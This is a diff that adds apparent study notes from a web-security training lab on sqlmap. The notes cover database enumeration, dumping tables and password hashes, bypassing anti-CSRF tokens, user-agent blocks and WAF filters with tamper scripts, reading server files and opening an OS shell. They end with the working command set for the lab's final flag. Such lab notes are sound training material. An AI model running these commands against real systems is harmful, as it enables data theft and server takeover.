@@ -157,3 +157,118 @@ NOTE: most likely not necessary that often.
 - titles: true when the page has a specific title
 - code: true when the page gives a specific http status code
 
+#### Enumerating with sqlmap
+
+Some useful ways to enumerate:
+```
+sqlmap -u "http://154.57.164.78:31412/case1.php?id=1" --banner --current-user --current-db 
+
+sqlmap -u "http://154.57.164.78:31412/case1.php?id=1" -D testdb -T flag1 --dump
+
+Searching for columns with "style" in it:
+sqlmap -u "http://154.57.164.78:31412/case1.php?id=1" --search -C style
+
+-> Can do the same with Table etc.
+
+
+sqlmap -u "http://154.57.164.78:31412/case1.php?id=1" -D testdb -T users --passwords
+
+```
+
+
+NOTE: reading csv files quickly in terminal
+```
+column -s, -t < /home/kali/.local/share/sqlmap/output/154.57.164.78/dump/testdb/users.csv
+```
+
+
+#### Bypassing web app protections against sqli attacks 
+
+**Anti-CSRF tokens:**
+- Need to spesify a token for each request 
+```
+sqlmap -u "http://154.57.164.78:31412/case8.php" --data="id=39&t0ken=AViAOG5d3BQAHevMRf0uCMH4rHq90C2TPVJnI1B2z4" --csrf-token="t0ken"
+```
+- SQLmap will parse the request and add a valid value for the anti-csrf header. 
+
+**Random additional values:**
+```
+sqlmap -u "http://154.57.164.78:31412/case9.php?id=1&uid=784705980" --randomize=uid --batch -v 5 | grep URI
+```
+- Need a unique uid for each id value we query
+
+**Blacklisted user-agents:**
+- Some useragents are banned on a site, example sqlmap useragent
+- We can bypass with by having a random one 
+```
+sqlmap -r sqli_test --random-agent
+```
+
+**Escaping character filtering:**
+- Some characters are filtered out via WAF or IPS
+- We can bypass them via the --tampering flag 
+ex:
+```
+sqlmap -r sqli_test --tamper=between 
+```
+- There are a many options for tamper 
+
+
+**Other things:**
+- Ip address concealing in case our ip is blocked, use the --proxy flag 
+- Misc bypass with python using --eval, can write your only login for what you want to append to the request: 
+```
+sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+```
+- --chunked ; to split the post request body into multiple chunks
+- HTTP parameter pollution (HPP) - kind of similar to chuncked. 
+
+#### OS exploitation via sqlmap
+- First we need to know the privileges of the database user:
+```
+sqlmap -u "http://154.57.164.65:31612/?id=1" --is-dba
+```
+-> current user is DBA: True 
+
+So we can read and write files via sqli.
+
+**Reading files via sqlmap:**
+```
+sqlmap -u "http://154.57.164.65:31612/?id=1" --file-read "/var/www/html/flag.txt"
+```
+
+
+**Getting os shell directly:**
+- sometimes we can get a os shell directly via sqlmap
+```
+sqlmap -u "http://154.57.164.65:31612/?id=1" --os-shell
+```
+- If this do not work directly, we can try a different --technique
+
+#### Assessment:
+
+- We have a request we want to test for sqli: (/action.php )
+- We are given info from the exercise that it has basic protections
+
+```
+sqlmap -r sqli_test --random-agent --tamper=between,randomcase --level=3 --risk=3
+
+WORKS:
+sqlmap -r sqli_test --random-agent --chunked --tamper=between,randomcase --level=3
+```
+
+web server operating system: Linux Debian 10 (buster)
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+database: production
+table: final_flag 
+
+```
+sqlmap -r sqli_test --random-agent --chunked --tamper=between,randomcase --dbs   
+```
+-> No DBA
+
+But we get the final flag from a table with this command:
+```
+sqlmap -r sqli_test --random-agent --chunked --tamper=between,randomcase -D production -T final_flag -C content --dump
+```
